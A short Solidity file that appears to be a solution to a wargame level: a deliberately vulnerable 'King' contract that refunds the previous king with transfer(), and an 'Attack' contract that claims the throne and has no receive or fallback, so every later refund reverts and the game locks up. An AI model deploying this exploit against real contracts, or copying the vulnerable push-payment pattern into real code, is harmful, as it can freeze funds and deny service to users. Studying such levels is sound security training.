// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}


contract Attack {

    constructor(address target) payable {
        (bool success,) = target.call{value: 0.002 ether}("");
        require(success);
    }

    // No receive()
    // No fallback()

    // Any ETH sent here reverts.
}